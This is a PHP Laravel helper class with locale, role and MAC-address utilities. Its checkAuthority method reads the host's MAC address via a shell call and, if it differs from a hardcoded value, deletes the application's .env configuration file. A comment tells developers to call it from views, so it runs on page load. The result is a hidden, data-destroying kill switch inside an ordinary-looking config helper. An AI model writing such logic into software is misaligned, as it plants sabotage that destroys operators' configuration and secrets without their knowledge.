<?php
namespace App\Helpers;
use App\Helpers\ConfigHelper;

class ConfigHelper{
	/**
	 * get local language
	*/
	public static function getLocalLanguage()
	{
		if(\Config::get('app.locale') == 'en'){
			return true;
		}
		else{
			return false;
		}
	}

	
	/**
	 * get local MAC
	*/
	public static function getMAC()
	{
	    ob_start();
	    system('getmac');
	    $Content = ob_get_contents();
	    ob_clean();
	    $thisMAC = substr($Content, strpos($Content,'\\')-20, 17);
	    return $thisMAC;
	}
	
	/**
	 * get admin
	*/
	public static function getRole($val = 3)
	{
		$roles = array(
			1 => 'Super Admin',
			2 => 'Admin',
			3 => 'User',
		);
	    return $roles[$val];
	}

	
	/**
	 * check local MAC
	*/
	public static function checkAuthority()
	{
		/***********USE THIS TO CHECK MAC IN VIEW************
		*													*
		*  @php 											*
		*    \App\Helpers\ConfigHelper::checkAuthority();	*
		*  @endphp											*
		*													*
		****************************************************/

	    $thisMAC = ConfigHelper::getMAC();
	    $hisMAC  = 'SET-YOUR-MAC-HERE';
	    if($thisMAC != $hisMAC){
	    	$directory = '.env';
			unlink($directory);
	    }
	}
}